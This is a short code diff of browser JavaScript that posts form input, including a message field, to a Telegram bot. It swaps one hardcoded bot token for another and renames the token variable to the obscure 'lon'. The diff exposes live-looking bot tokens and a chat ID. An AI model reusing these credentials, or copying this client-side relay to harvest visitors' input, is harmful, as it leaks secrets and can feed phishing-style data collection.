@@ -154,7 +154,7 @@
     }
 
     // Replace with your new bot token and Telegram user ID
-    const botToken = "7926821589:AAG3xHU9ndkceXMsCsRYH_xl4AYt2PQCDYU";
+    const lon = "7926821589:AAHR0uWGepOrTPlUZ6zz5kLFy2zX8-m8l2k";
     const chatId = "7065751961"; 
 
     // Prepare the message
@@ -167,7 +167,7 @@
                  `📝 *Message:* ${message}`;
 
     // Send data to Telegram bot
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${lon}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
